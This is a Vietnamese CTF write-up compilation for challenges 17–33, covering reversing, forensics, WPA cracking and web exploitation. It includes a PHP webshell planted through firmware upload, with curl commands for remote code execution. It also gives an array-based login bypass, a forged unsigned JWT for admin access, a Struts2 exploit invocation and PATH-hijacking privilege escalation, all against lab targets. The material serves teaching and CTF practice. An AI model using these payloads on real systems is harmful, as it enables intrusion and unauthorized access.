**(g) Cạm bẫy & cách khác.** (1) Chỉ giải được với cipher RSA kx; ECDHE/DHE cần SSLKEYLOGFILE (không có ở đây). (2)
Phải khai đúng IP/port/protocol trong Wireshark. (3) Nếu capture thiếu ClientKeyExchange, giải mã thất bại. (4)
`openssl`/`tshark` cũng làm được. (5) pcapng mở trực tiếp, không cần chuyển pcap.

**(h) Tham khảo.** RFC 5246 (TLS 1.2 handshake); Wireshark TLS decryption (RSA keys list); Perfect Forward Secrecy;
`openssl rsa`, `tshark -o tls.keys_list`.


---

## 17. Which (OS - 60)

⚠️ **Repo không có lời giải sẵn** (`README.md` rỗng, **không có file đề** trong repo → không thể disassemble;
không bịa flag).

**(b) Kiến thức nền + phương pháp tổng quát.** Tên "Which" gần như chắc chắn ám chỉ lệnh **`which`** của Linux —
tra *đường dẫn đầy đủ* của một chương trình bằng cách duyệt các thư mục trong biến môi trường **`$PATH`** theo
thứ tự. Lớp bài liên quan: **PATH hijacking / relative-path exec**. Cơ chế: một chương trình (thường SUID-root hoặc
dịch vụ) gọi lệnh ngoài **không ghi đường dẫn tuyệt đối** — ví dụ `system("ls")` thay vì `/bin/ls`. Khi đó shell
tìm `ls` theo `$PATH`; kẻ tấn công đặt một `ls` giả ở thư mục ghi được rồi **thêm thư mục đó lên đầu `$PATH`**
(`export PATH=/tmp:$PATH`) → chương trình chạy mã của attacker (đọc flag / lên quyền).
Phương pháp xử lý *nếu có file*: (1) `strings`/`objdump -d` tìm lời gọi `system`/`execlp`/`popen` với tham số là
tên lệnh trần (không có `/`); (2) kiểm tra bit **SUID** (`ls -l`, `find -perm -4000`); (3) tạo binary giả cùng tên,
chèn lên đầu `$PATH`, chạy lại chương trình mục tiêu. (Tất cả nên làm trong VM.)

## 18. Record (OS - 70)

⚠️ **Repo không có lời giải sẵn** (`README.md` rỗng, **không có file đề** → không thể disassemble; không bịa flag).

**(b) Kiến thức nền + phương pháp tổng quát.** "Record" có thể là: (1) **bản ghi syscall** (`strace`/`ltrace` log,
hoặc `seccomp`/`ptrace` recording); (2) file ghi phiên terminal của lệnh **`script`** (tạo `typescript` + timing
file — phát lại bằng `scriptreplay`); (3) bản ghi phím/âm thanh; (4) **record** trong ngữ cảnh cấu trúc dữ liệu
(struct/record của binary). Phương pháp *nếu có file*: dùng `file` xác định loại; nếu là typescript → `scriptreplay`
hoặc đọc trực tiếp (có thể chứa lệnh gõ lộ flag); nếu là log syscall → lần theo các `write`/`open` để dựng lại
hành vi; nếu là binary → `objdump`/`strings`. Không đủ dữ liệu để kết luận flag.

## 19. Shared (OS - 110)

> **PASS 3 — đã disassemble tĩnh** `main.exe` và `libflag.so` (`readelf -d`, `nm -D`, `objdump -d`, `objdump -s`)
> và **tái hiện glibc `rand()` bằng Python** để giải mã flag *mà không chạy binary*.

**(a) Đề bài & metadata.** OS, 110đ. File: `Shared (OS - 110)/Shared_04dca129c011213979aded2e7bef71d3.zip`
(4588 bytes; md5 `04dca129c011213979aded2e7bef71d3` — ✅ **khớp tên**, file nguyên bản; sha1
`7b57fbc78f278303beff68a5134c723683963185`). Giải nén ra:
`main.exe` — `ELF 64-bit x86-64, dynamically linked, interp /lib64/ld-linux-x86-64.so.2, not stripped` (6721 B)
và `libflag.so` — `ELF 64-bit shared object, not stripped` (6337 B). Chạy `main.exe` báo lỗi thiếu thư viện.

**(b) Kiến thức nền.**
- **Shared library (.so):** thư viện dùng chung, nạp lúc chạy bởi **dynamic linker `ld.so`**. Chương trình khai báo
  các thư viện cần ở entry **`NEEDED`** trong section `.dynamic` (`readelf -d`). `ld.so` tìm `.so` theo thứ tự:
  **(1) RPATH** (cũ, trong ELF) → **(2) `LD_LIBRARY_PATH`** (biến môi trường) → **(3) RUNPATH** → **(4) cache
  `/etc/ld.so.cache`** → **(5) `/lib`, `/usr/lib`**. Không thấy → lỗi `cannot open shared object file`.
- **PLT/GOT:** khi gọi hàm từ `.so`, mã nhảy qua **PLT** (Procedure Linkage Table) → tra **GOT** (Global Offset
  Table) được `ld.so` điền địa chỉ thật lúc nạp. Vì thế `nm -D main.exe` thấy `print_flag` ở trạng thái **`U`**
  (undefined — sẽ lấy từ libflag.so).
- **`strace`:** in mọi **syscall**, gồm các lần `openat()` mà `ld.so` thử mở `.so` ở từng thư mục → thấy rõ nó tìm
  ở đâu và thiếu ở đâu (`ENOENT`).
- **glibc `rand()`/`srand()`:** bộ sinh số giả ngẫu nhiên **xác định** — cùng seed cho cùng dãy số. glibc mặc định
  dùng thuật toán **TYPE_3 additive feedback** (mảng trạng thái 31 phần tử; `r[i]=r[i-31]+r[i-3]`, xuất
  `(r[i]>>1)&0x7fffffff`). Vì xác định nên có thể **tái hiện offline** để tính y hệt chuỗi mà binary tạo ra.

**(c) Trinh sát (lệnh thật).**
```
$ file main.exe libflag.so      # main.exe: ELF exec; libflag.so: ELF shared object
$ readelf -d main.exe | grep NEEDED
   (NEEDED)  Shared library: [libflag.so]
   (NEEDED)  Shared library: [libc.so.6]
$ nm -D main.exe | grep print_flag
                 U print_flag          <-- lấy từ libflag.so
$ strace ./main.exe 2>&1 | grep -i libflag   # (mô tả theo writeup)
   openat(AT_FDCWD,"/.../libflag.so",...) = -1 ENOENT  (lặp ở nhiều thư mục)
```

**(d) Phân tích & reasoning (disassembly thật).**
`main` cực ngắn — chỉ gọi `print_flag` (nằm trong libflag.so):
```asm
00000000004005c4 <main>:
  4005c8: mov eax,0x0
  4005cd: call 4004b8 <print_flag@plt>     ; toàn bộ logic nằm ở libflag.so
  4005d7: leave ; ret
```
⇒ main.exe không chứa flag; **flag ở `libflag.so`**. Vì vậy chỉ cần cho `ld.so` tìm thấy `libflag.so` là chương
trình tự in flag. Ở đây **không có RPATH** (readelf không thấy RPATH/RUNPATH), nên `ld.so` tìm theo cache + đường
mặc định → mặc định không có `libflag.so` → `strace` thấy hàng loạt `ENOENT`. Tên bài "Shared" (shared library) +
tên flag "specify_the_library" khẳng định hướng: **chỉ định vị trí thư viện**.

Disassembly `print_flag` trong `libflag.so` cho thấy flag được **sinh runtime**, không nằm trong `strings`
(`strings libflag.so` chỉ có "print_flag", "flag.c"):
```asm
000000000000060c <print_flag>:
  ; dựng mảng 25 dword tại [rbp-0x80..]: 0x07,0x0a,0x3e,0x52,0x4c,0x69,0x24,0x09,0x0d,0x2c,0x36,
  ;   0x58,0x30,0x46,0x0a,0x54,0x45,0x23,0x52,0x40,0x5d,0x17,0x2c,0x4d,0x21
  6c4: mov DWORD [rbp-0x14], 0x19           ; đếm = 25
  6cb: mov edi, 0x7c5 ; call srand          ; srand(0x7c5 = 1989)
loop:
  mov ebx, [rbp+i*4-0x80]                    ; ebx = arr[i]
  call rand                                  ; r = rand()
  ; (0x51eb851f, sar 5...) = thủ thuật tính r % 100
  lea eax, [rbx + (r%100)]                   ; ký tự = arr[i] + (r % 100)
  call putchar                               ; in ký tự
  ; i++ ; cmp i, 25 ; jl loop
  mov edi, 0xa ; call putchar                ; in '\n'
```
Thuật toán: `char[i] = arr[i] + (rand() % 100)` với `srand(1989)`. Hằng `0x51EB851F` + `sar 5` là **magic number
chia cho 100** (reciprocal) mà compiler sinh ra để tính `r % 100` nhanh (không dùng `div`).

**(e) Lời giải — hai hướng.**

*Hướng A (giải mã tĩnh — PASS 3 đã dùng để kiểm chứng, KHÔNG chạy binary):* tái hiện glibc `rand()` + áp công thức:
```python
def glibc_rand_seq(seed, n):              # TYPE_3 additive feedback của glibc
    r=[seed & 0xffffffff]
    for i in range(1,31):
        hi,lo=divmod(r[i-1],127773)
        w=16807*lo-2836*hi
        r.append(w+2147483647 if w<0 else w)
    for i in range(31,34): r.append(r[i-31])
    for i in range(34,344): r.append((r[i-31]+r[i-3])&0xffffffff)
    out=[]
    for _ in range(n):
        r.append((r[-31]+r[-3])&0xffffffff)
        out.append((r[-1]>>1)&0x7fffffff)
    return out
arr=[0x07,0x0a,0x3e,0x52,0x4c,0x69,0x24,0x09,0x0d,0x2c,0x36,0x58,0x30,0x46,
     0x0a,0x54,0x45,0x23,0x52,0x40,0x5d,0x17,0x2c,0x4d,0x21]
rs=glibc_rand_seq(1989,len(arr))
print(''.join(chr((a+(r%100))&0xff) for a,r in zip(arr,rs)))   # -> flag{specify_the_library}
```
Kết quả chạy thật: **`flag{specify_the_library}`** (25 ký tự — khớp số đếm 0x19).

*Hướng B (cho ld.so tìm thấy thư viện — như writeup):*
```bash
unzip Shared_*.zip ; chmod +x main.exe
LD_LIBRARY_PATH=. ./main.exe        # trỏ đường tìm .so vào thư mục hiện tại
#   -> flag{specify_the_library}
# hoặc: sudo cp libflag.so /usr/lib/ && sudo ldconfig && ./main.exe
```
(Ảnh `flag.png` trong repo xác nhận output `flag{specify_the_library}`.)

**(f) Flag & ý nghĩa.** `flag{specify_the_library}` — "hãy chỉ định (vị trí) thư viện". Dạy cơ chế nạp shared
library, `strace`, `LD_LIBRARY_PATH`.

**(g) Cạm bẫy & cách khác.** (1) `strings` vô dụng — flag sinh runtime bằng `rand()`; phải reverse `print_flag`.
(2) Hướng A độc lập hoàn toàn với môi trường chạy (chỉ cần trích mảng + seed). (3) Nếu tái hiện `rand()` sai biến
thể (vd dùng `rand()` kiểu LCG của Windows) sẽ ra chuỗi khác — phải đúng glibc TYPE_3. (4) `patchelf --set-rpath .
main.exe` để nhúng RPATH thay cho `LD_LIBRARY_PATH`. (5) **Không chạy binary lạ trên máy thật** — VM/Docker.

**(h) Tham khảo.** `man ld.so`; `strace`, `ldd`, `readelf -d`, `nm -D`, `patchelf`; glibc `random()` TYPE_3;
magic-number division (`0x51EB851F` cho `/100`).

## 20. Calc (OS - 180)

⚠️ **Repo không có lời giải sẵn** (`README.md` rỗng, **không có file đề** → không thể disassemble; không bịa flag).

**(b) Kiến thức nền + phương pháp tổng quát.** Điểm cao (180) ⇒ bài khó. "Calc" (calculator) thường là một trong
các dạng: (1) **máy tính biểu thức có lỗ hổng** — phân tích/eval biểu thức người dùng dẫn tới **format string**
(`printf(user_input)` → đọc/ghi bộ nhớ qua `%x`/`%n`), **integer overflow**, hoặc **command/eval injection** nếu
dùng `eval`/`system`; (2) **buffer overflow** khi nhập biểu thức dài → ghi đè return address (bài pwn cổ điển: cần
`checksec`, tìm gadget ROP, hoặc ghi đè biến); (3) **reverse một VM/bytecode nhỏ** (máy tính tự định nghĩa opcode —
phải dịch ngược bộ thông dịch). Phương pháp *nếu có file*: `file`/`checksec` (NX, PIE, canary, RELRO); `objdump
-d`/`strings` tìm `printf`/`gets`/`scanf`/`system`; thử input biên (chuỗi dài, `%x%x%x`, số âm/tràn). Không đủ dữ
liệu để kết luận flag.


---

## 21. Fuzzy (Forensic - 50)

⚠️ **Repo không có lời giải sẵn** (`README.md` rỗng). File đề:
`Fuzzy (Forensic - 50)/Fuzzy_8648...exe` (102391 bytes; md5 thật `2f43c14cad2db191775275104f06896d`; tên file
là **sha256**) và `Fuzzy_b863...zip` (1233549 bytes).

**Phân tích tĩnh (suy luận):** tên "Fuzzy" gần như chắc chắn nói về **fuzzy hashing** — ví dụ **ssdeep** (context
triggered piecewise hashing) hoặc **TLSH**, dùng đo *độ tương đồng* giữa các file (khác hẳn md5/sha so khớp
chính xác). Hướng chuẩn: giải nén zip (có thể chứa nhiều biến thể của file .exe), rồi `ssdeep -d *` tìm cặp file
*gần giống nhau* → file đồng dạng chính là đáp án / chứa flag. Không có file giải nên không khẳng định flag.

## 22. Melancholy Holiday(1) Broken Head (Forensic - 60)

**(a) Đề bài & metadata.** Forensic, 60đ. File:
`Melancholy Holiday(1) Broken Head (Forensic - 60)/Broken_Head_365a1c80b6ac1c5b908a3fa2526a3535320684e1.zip`
(286403 bytes; git blob sha1 `dac8687892049da0b8fa1c3cb3d4fd963859487e`; tên file là **sha1**) và
`important.bmp` (368502 bytes). ZIP không giải nén được vì **header hỏng** ("Broken Head"). ⚠️ **Writeup gốc
còn dở dang** ("Under Construction... Please waiting...") — repo **chưa có flag**.

**(b) Kiến thức nền.** Cấu trúc **ZIP (PKZIP)**: mỗi file có một **Local File Header** bắt đầu bằng magic
`50 4B 03 04` (`PK\x03\x04`), gồm các trường: version, flags, compression method, mod time, **CRC-32**,
**compressed size**, **uncompressed size**, **filename length**, **extra length**, rồi tới **filename** và dữ
liệu. Cuối file có **Central Directory** (magic `PK\x01\x02`) và **End of Central Directory** (`PK\x05\x06`).
Nếu sửa sai một trường độ dài (như *filename length*), bộ giải nén đọc lệch toàn bộ → hỏng.

**(c) Trinh sát.**
```
unzip Broken_Head_*.zip
#  file #1:  bad zipfile offset (local header sig):  0     <-- không thấy magic PK ở đầu
xxd Broken_Head_*.zip | head
#  00000000: dead beef 1400 0000 0000 ...                  <-- 4 byte đầu là DE AD BE EF (giả)
```

**(d) Phân tích & reasoning.** Hai lỗi cố ý được writeup phát hiện:
1. **4 byte đầu bị thay bằng `DE AD BE EF`** thay vì magic ZIP. Sửa `DEADBEEF` → `50 4B 03 04` (PK\x03\x04).
2. Sau khi sửa magic, vẫn lỗi: **Filename Length = `1F55` (8021)** — sai (tên thật `important.bmp` chỉ 13 ký
   tự). Giá trị quá lớn khiến "tên file" nuốt cả dữ liệu, dẫn tới `mismatching filename` và `bad CRC`. Phải
   **sửa Filename Length về `0D 00` (13)** để parser đọc đúng tên rồi mới tới dữ liệu.
Sau 2 bước này, rút được `important.bmp`.

**(e) Lời giải (định hướng — writeup gốc chưa hoàn tất).**
```
# Bước 1: sửa magic (vim + xxd)
vim Broken_Head_*.zip
:%!xxd
#  đổi dòng 0: 'dead beef' -> '504b 0304'
:%!xxd -r
:wq
# Bước 2: sửa Filename Length tại offset 0x1A từ '55 1F' -> '0D 00' (little-endian = 13)
#  (dùng lại vim+xxd hoặc hex editor; cẩn thận little-endian)
# Bước 3: giải nén lấy important.bmp
unzip Broken_Head_*.zip
# Bước 4 (forensic BMP): soi flag trong ảnh
file important.bmp; xxd important.bmp | head          # kiểm tra header BMP '42 4D'
# flag thường ẩn ở: cuối file (append), vùng pixel (LSB/stego), hoặc header BMP bị sửa.
strings -n 6 important.bmp | grep -i flag
zsteg important.bmp 2>/dev/null                        # nếu là ảnh có bitplane
```

**(f) Flag & ý nghĩa.** ⚠️ **Chưa xác định** — writeup gốc dừng ở bước mô tả `zipdetails`. Tên "Broken Head"
= header (đầu file) bị hỏng; cần sửa header ZIP rồi phân tích `important.bmp` để lấy flag.

**(g) Cạm bẫy & cách khác.** (1) Little-endian: `1F55` đọc trong file là byte `55 1F` → giá trị `0x1F55`. Sửa
về 13 = byte `0D 00`. (2) Còn trường size nén/giải nén và CRC có thể cũng bị đụng — nếu `unzip` vẫn kêu CRC,
dùng `zip -FF` (fix) hoặc `7z` ép giải nén, hoặc carve dữ liệu stored trực tiếp. (3) Với BMP: so sánh kích
thước khai báo trong header với kích thước thật để phát hiện dữ liệu "thừa" giấu cuối file.

**(h) Tham khảo.** Đặc tả ZIP (APPNOTE.TXT); `zipdetails`, `binwalk`, `zip -FF`; định dạng BMP; `zsteg`.

## 23. Starting (Forensic - 80)

⚠️ **Repo không có lời giải sẵn** (`README.md` rỗng). Tên "Starting" có thể ám chỉ **startup/autorun**
(registry Run key, scheduled task, `.lnk`), hoặc "điểm khởi đầu" của một chuỗi forensic. Không đủ dữ liệu để
đưa flag.

## 24. Notes (Forensic - 120)

⚠️ **Repo không có lời giải sẵn** (`README.md` rỗng). Có thể liên quan ứng dụng ghi chú (Sticky Notes
`StickyNotes.snt`, OneNote), hoặc dữ liệu artifact chứa ghi chú ẩn. Không đủ dữ liệu để đưa flag.

## 25. PDF-JPGS (Forensic - 120)

⚠️ **Repo không có lời giải sẵn** (`README.md` rỗng). Tên "PDF-JPGS" gợi **các ảnh JPG nhúng trong PDF**: hướng
chuẩn là tách ảnh bằng `pdfimages -all file.pdf out`, `binwalk`/`foremost` để carve, rồi soi từng JPG (có thể
một ảnh chứa flag, hoặc ghép nhiều mảnh JPG lại). Không đủ dữ liệu để đưa flag.


---

## 26. Intact (Network - 80)

⚠️ **Repo không có lời giải sẵn** (`README.md` rỗng). File đề:
`Intact (Network - 80)/Intact_8688e1a1263c414450b12985e0d5620b.pcapng` (12040 bytes; md5
`8688e1a1263c414450b12985e0d5620b` — ✅ **khớp tên**, file nguyên bản; sha1
`069549649cb3e41bcaba9a2c6f5a62cf4b6b2bb1`).

**Phân tích tĩnh (suy luận):** đây là bài phân tích gói tin (file pcapng còn nguyên vẹn, có thể mở). Hướng
chuẩn: mở Wireshark → `Statistics > Protocol Hierarchy` / `Conversations` để nắm giao thức; dùng
`File > Export Objects` (HTTP/SMB/FTP) để rút file truyền; `Follow Stream` đọc payload; `strings
Intact_*.pcapng | grep -i flag`. Tên "Intact" ("nguyên vẹn") có thể gợi kiểm tra **tính toàn vẹn** (checksum,
ghép lại file bị chia nhỏ). Không có file giải nên không khẳng định flag — nhưng file pcap **còn tải được**, có
thể phân tích thêm nếu cần.

## 27. WLAN (Network - 150)

**(a) Đề bài & metadata.** Network, 150đ. File:
`WLAN (Network - 150)/WLANcapture_2c222708abc1c8406992bbb1e6004615.zip` (527704 bytes; git blob sha1
`509896c75eb17456ac4448d769821e4060af42f4`; md5 nhúng tên `2c222708abc1c8406992bbb1e6004615`). Mục tiêu: tìm
**IP server** mà client yêu cầu.

**(b) Kiến thức nền.** Gói **802.11 (Wi-Fi)** ở lớp vô tuyến bị **mã hóa WPA/WPA2**; muốn đọc nội dung (IP, HTTP)
phải có **mật khẩu AP**. Quy trình: (1) **bắt 4-way handshake** (EAPOL) để `aircrack-ng` brute mật khẩu bằng
wordlist; (2) `airdecap-ng` dùng mật khẩu để **giải mã** toàn bộ capture thành pcap thường; (3) mở Wireshark đọc
lớp IP/HTTP như bình thường. Khái niệm: **ESSID** = tên mạng Wi-Fi; **BSSID** = MAC của AP.

**(c) Trinh sát.**
```
unzip WLANcapture_*.zip                 # ra file .pcapng/.cap 802.11
# Mở Wireshark: thấy toàn frame 802.11 (Radiotap/Dot11), dữ liệu bị mã hóa.
```

**(d) Phân tích & reasoning.** Dữ liệu mã hóa → không đọc IP ngay. Chỉ có **1 ESSID** trong file ⇒ đó là mạng
mục tiêu. Có handshake ⇒ brute được mật khẩu. Writeup tìm ra mật khẩu `pass1234`.

**(e) Lời giải.**
```bash
# (nếu cần) convert pcapng -> cap:
#   tshark -F pcap -r WLANcapture.pcapng -w WLANcapture.cap   (hoặc dùng Wireshark 'Save As')
# Bước 1: bẻ mật khẩu WPA từ handshake:
aircrack-ng -w wordlist.txt WLANcapture.cap
#   -> KEY FOUND! [ pass1234 ]   (ESSID duy nhất trong file)
# Bước 2: giải mã toàn bộ capture:
airdecap-ng -e <ESSID> -p pass1234 WLANcapture.cap
#   -> tạo WLANcapture-dec.cap (đã giải mã)
# Bước 3: mở WLANcapture-dec.cap bằng Wireshark, lọc http / theo dõi TCP stream,
#   xem client request tới server nào -> IP đích = 192.168.11.202
```

**(f) Flag & ý nghĩa.** `flag{192.168.11.202}` — IP server mà client yêu cầu (sau khi giải mã WPA).

**(g) Cạm bẫy & cách khác.** (1) `aircrack` cần đúng handshake EAPOL trong file; nếu thiếu, không brute được.
(2) Mật khẩu yếu (`pass1234`) nên wordlist như rockyou là đủ. (3) `airdecap-ng` cần đúng ESSID. (4) Có thể nhập
thẳng khóa WPA vào Wireshark (Preferences > IEEE 802.11 > Decryption keys, dạng `wpa-pwd: pass1234:ESSID`) thay
cho airdecap.

**(h) Tham khảo.** aircrack-ng suite (`aircrack-ng`, `airdecap-ng`); WPA 4-way handshake; Wireshark 802.11
decryption.

## 28. broken user management (Web - 150)

**(a) Đề bài & metadata.** Web, 150đ. Target `10.3.204.202:10080`. Luồng: đăng ký → đăng nhập → server trả
**JWT**; truy cập trang chính bị **401 Unauthorized**. File: README + nhiều ảnh (register/login/token/jwt-sign/
flag).

**(b) Kiến thức nền.** **JWT** gồm 3 phần `base64url(header).base64url(payload).signature`. `header` khai báo
thuật toán ký, ví dụ `{"alg":"HS256","typ":"JWT"}`. Chữ ký bảo đảm payload không bị sửa. **Lỗ hổng `alg:none`:**
nếu server chấp nhận token có `"alg":"none"` (hoặc **không kiểm tra chữ ký**), kẻ tấn công tự chế payload (ví dụ
nâng quyền `auth=1`) mà **không cần khóa bí mật**. Ở bài này, token "không có chữ ký và không có thuật toán" →
server tin payload mù quáng.

**(c) Trinh sát.** Đăng ký + đăng nhập → bắt token (ảnh `token.png`): payload chứa trường `auth` (ví dụ `auth=0`),
và token **không có phần chữ ký**. Truy cập `/users` → 401 (ảnh `users-req.png`), cần quyền cao hơn.

**(d) Phân tích & reasoning.** Vì token không ký/không alg, chỉ cần sửa `auth` từ 0→1 là có quyền admin. Dùng
**CyberChef** (JWT Sign/encode) hoặc tự base64url-encode payload mới, ghép lại thành JWT (không chữ ký).

**(e) Lời giải.**
```
1) Giải mã payload JWT hiện tại (base64url) -> thấy {"auth":0,...}
2) Sửa thành {"auth":1,...}, base64url-encode lại.
3) Ghép token mới: <header_b64>.<payload_b64_sửa>.   (để trống/none phần chữ ký, như token gốc)
   -> dùng https://gchq.github.io/CyberChef/ (JWT) cho nhanh.
4) Thay header "Authorization: <token mới>" rồi gọi /users (Burp/curl):
   curl -H "Authorization: <token mới>" http://10.3.204.202:10080/users
   -> server trả toàn bộ dữ liệu user kèm flag.
```

**(f) Flag & ý nghĩa.** `flag{SXMgdGhlIGNvcnJlY3QgYW5zd2VyISBDb25ncmF0cyE}`.
Phần trong `{}` giải Base64 ra: **"Is the correct answer! Congrats!"** (đã kiểm chứng Python). Thông điệp: quản
lý người dùng "broken" vì JWT không được ký/không kiểm tra alg.

**(g) Cạm bẫy & cách khác.** (1) `alg:none` phải viết đúng để server chấp nhận; một số lib yêu cầu chữ ký rỗng.
(2) Biến thể khác của lỗ hổng JWT: **confusion RS256→HS256** (ký HMAC bằng public key), hay **khóa yếu** (brute
HS256 bằng `jwt_tool`/hashcat). (3) Đừng quên trường khác trong payload (exp, user id) phải hợp lệ.

**(h) Tham khảo.** RFC 7519 (JWT); tấn công `alg:none`; `jwt_tool`, CyberChef JWT.

## 29. broken router (Web - 150)

**(a) Đề bài & metadata.** Web, 150đ. Target `10.3.204.206` (trang quản trị router). File: README + ảnh (index/
login/panel/updatedFirmware/result/ls/flag) + `1.1.zip` (667 bytes — firmware mẫu; md5
`dcc2024f732ae75f7960058f58e42295`).

**(b) Kiến thức nền.** (1) **PHP type juggling / array bypass:** nhiều ứng dụng PHP so sánh mật khẩu kiểu
`if ($pass == $stored)` hoặc `strcmp($pass,$stored)==0`. Nếu gửi `password[]=x` (mảng) thay vì chuỗi:
`strcmp(array, string)` trả **NULL** (PHP cũ) → `NULL == 0` là **true** → **bypass đăng nhập**. (2) **Upload
webshell:** chức năng cập nhật firmware nhận ZIP chứa file PHP; nếu server **chạy PHP** trong file upload, chèn
`<?php system($_POST['cmd']); ?>` là có **RCE**.

**(c) Trinh sát.** Trang login (ảnh `2-login.png`). Thử gửi `password` dạng mảng:
```
POST /login   username=admin&password[]=anything
-> đăng nhập thành công (bypass).
```
Sau khi vào: form "Firmware Update" cho upload ZIP, kèm file mẫu `1.1.zip` (gồm 1 PHP in "Version: 1.1 updated!"
và 1 TXT).

**(d) Phân tích & reasoning.** Server giải nén ZIP và **thực thi file PHP** khi bấm "Check update result" (ảnh
`5-result.png`). Vậy chỉ cần nhét webshell vào file PHP, nén lại đúng cấu trúc (PHP + TXT như mẫu), upload → có
RCE để `ls` và `cat` flag.

**(e) Lời giải.**
```
# 1) Bypass login bằng array:
curl -i -c c.txt -d 'username=admin&password[]=x' http://10.3.204.206/login
# 2) Sửa file PHP trong 1.1.zip, thêm webshell:
#    chèn vào cuối PHP:  <?php system($_POST['cmd']); ?>
# 3) Nén lại cả PHP + TXT, upload qua form Firmware Update, bấm "Check update result".
# 4) RCE:
curl -b c.txt -d 'cmd=ls'          http://10.3.204.206/<đường_dẫn_php_đã_upload>   # thấy flag.php
curl -b c.txt -d 'cmd=cat flag.php' http://10.3.204.206/<đường_dẫn_php_đã_upload>  # lấy flag
```

**(f) Flag & ý nghĩa.** `flag{94550b955569733446ebf2105ed54e9c22276d912befab7a4c}` — router "broken" do (1)
login bypass bằng array và (2) upload firmware cho chạy PHP tùy ý (RCE).

**(g) Cạm bẫy & cách khác.** (1) Phải gửi `password[]` đúng cú pháp mảng (Content-Type form-urlencoded hoặc
multipart). (2) Nếu flag ở `flag.php` thì `cat` ra source (vì PHP không được render) — hoặc dùng
`php://filter`/`cat` để lấy nội dung thô. (3) Có thể webshell bị chặn phần mở rộng → thử `.phtml`, `.php5`, hoặc
chèn vào file hợp lệ.

**(h) Tham khảo.** PHP type juggling & `strcmp` array bypass; OWASP Unrestricted File Upload; webshell PHP.

## 30. well-known vulnerability 1 (Web - 150)

**(a) Đề bài & metadata.** Web, 150đ. Gợi ý từ tên: "lỗ hổng nổi tiếng, có exploit public". Trinh sát thấy máy
chủ chạy **Apache Tomcat 7.0.96** (lộ ở trang 404/Not Found).

**(b) Kiến thức nền.** Các khung Java/Tomcat có nhiều RCE nổi tiếng. Writeup gốc nhắc **Struts2** — chuỗi lỗ
hổng OGNL injection (S2-045/048/057...) cho phép chạy lệnh qua header/tham số. Ngoài ra Tomcat còn có
CVE-2017-12617 (PUT JSP khi bật `readonly=false`) hay Ghostcat (CVE-2020-1938, AJP). Cách làm chung: xác định
đúng component/phiên bản → tìm PoC public → chạy lệnh đọc flag.

**(c) Trinh sát.** Trang 404 lộ "Apache Tomcat/7.0.96". Dò ứng dụng Struts/endpoint `.action`/`.do`.

**(d) Phân tích & reasoning.** Dựa gợi ý "well-known" + banner → dùng exploit công khai (Struts2 OGNL RCE) để
RCE, sau đó đọc flag trên server.

**(e) Lời giải (theo writeup).** Dùng PoC Struts2 (ví dụ S2-045 qua `Content-Type` OGNL) hoặc công cụ như
Metasploit/`struts-pwn.py`:
```
python struts-pwn.py --url http://<target>/<endpoint> -c "cat /path/to/flag"
```

**(f) Flag & ý nghĩa.** ⚠️ **Writeup gốc không ghi flag** (server live đã gỡ). Bài học: vá Struts2/Tomcat.

**(g) Cạm bẫy & cách khác.** Phải khớp đúng CVE với version/endpoint; nhiều PoC Struts kén payload. Nếu là lỗ
hổng Tomcat (PUT JSP/Ghostcat) thì cách khai thác khác hẳn.

**(h) Tham khảo.** Struts2 S2-045/048/057; CVE-2017-12617; Ghostcat CVE-2020-1938.

## 31. CAPTCHA Challenge (Web - 200)

**(a) Đề bài & metadata.** Web, 200đ. Target `10.3.204.204`. File: `captcha.py` (2664 bytes, Python 2 — script
giải) + README rỗng. Phải giải CAPTCHA **đúng 1000/1000 lần liên tiếp** để server trả flag.

**(b) Kiến thức nền.** **CAPTCHA** yếu (ảnh text rõ) có thể **bẻ bằng OCR tự động**. Script dùng **`gocr`** (OCR
mã nguồn mở) đọc ảnh `/image`, hiệu chỉnh các ký tự dễ nhầm, rồi POST đáp án tới `/challenge`. Vì cần 1000 lần
đúng liên tiếp, độ chính xác OCR phải rất cao → phải "sửa" các lỗi OCR thường gặp (ví dụ `O`↔`0`, `f`↔`F`).

**(c) Trinh sát / đọc script.** `captcha.py` làm:
1. Lặp 1000 lần; mỗi lần GET `/image` lưu `tmp.png`.
2. `gocr -l 0 -i tmp.png > result.txt` → đọc kết quả OCR.
3. Hiệu chỉnh: bỏ space, `_`→`Q`, `f`→`F`; nếu có `O`/`0` thì **bỏ ảnh, lấy ảnh khác** (vì gocr hay sai ký tự
   này → tránh đoán sai).
4. POST `captcha` tới `/challenge`, đọc điểm `<h2>x/1000</h2>`; nếu `1000/1000` → in flag; nếu `0/1000` → mở ảnh
   để người kiểm tra và thoát.

**(d) Phân tích & reasoning.** Mấu chốt là **tự động + sửa lỗi OCR có hệ thống**: do CAPTCHA tập ký tự giới hạn,
tác giả quan sát các cặp gocr hay nhầm rồi hard-code quy tắc thay thế; đồng thời **loại** các ảnh mà OCR dễ sai
(chứa O/0) để giữ chuỗi đúng không đứt. Nhờ đó đạt 1000/1000.

**(e) Lời giải.** Chạy `captcha.py` với session hợp lệ (cookie `fuel_csrf_token`, `fuelcid` — ứng dụng FuelPHP).
⚠️ Script là **Python 2** (cú pháp `print "..."`); muốn chạy lại cần Python 2 + `gocr` + `requests`, và **cập
nhật cookie/CSRF** mới. Khi đạt `1000/1000`, server in flag trong response.

**(f) Flag & ý nghĩa.** ⚠️ **Không ghi trong repo** (flag xuất hiện runtime khi đạt 1000/1000). Bài học: CAPTCHA
yếu bị OCR tự động bẻ.

**(g) Cạm bẫy & cách khác.** (1) Cookie/CSRF trong script đã hết hạn — phải lấy mới. (2) `gocr` có thể thay bằng
`tesseract` (thường chính xác hơn) + tiền xử lý ảnh (nhị phân hóa, khử nhiễu bằng OpenCV). (3) Nếu rate-limit,
cần thêm delay. (4) Python 2 EOL — port sang Python 3 (`print()`, `requests` vẫn dùng được).

**(h) Tham khảo.** `gocr`, `tesseract`; FuelPHP CSRF; kỹ thuật tiền xử lý ảnh cho OCR.

## 32. operand mistake (Web - 200)

⚠️ **Repo không có lời giải sẵn** (`README.md` rỗng, không file đề). Tên "operand mistake" gợi lỗi **dùng sai
toán tử**: ví dụ `==` thay vì `===` (PHP/JS **loose comparison / type juggling**), `|` thay `||`, hay so sánh
magic hash (`0e...` được PHP coi là 0 trong `==`). Hướng khai thác điển hình: gửi input khiến so sánh lỏng trả
true để bypass. Không đủ dữ liệu để đưa flag.

## 33. WAF (Web - 250)

⚠️ **Repo không có lời giải sẵn** (`README.md` rỗng, không file đề). Điểm cao nhất mảng Web (250). Tên "WAF"
(Web Application Firewall) gợi bài **bypass WAF** để khai thác SQLi/XSS/RCE bị chặn: các kỹ thuật thường dùng là
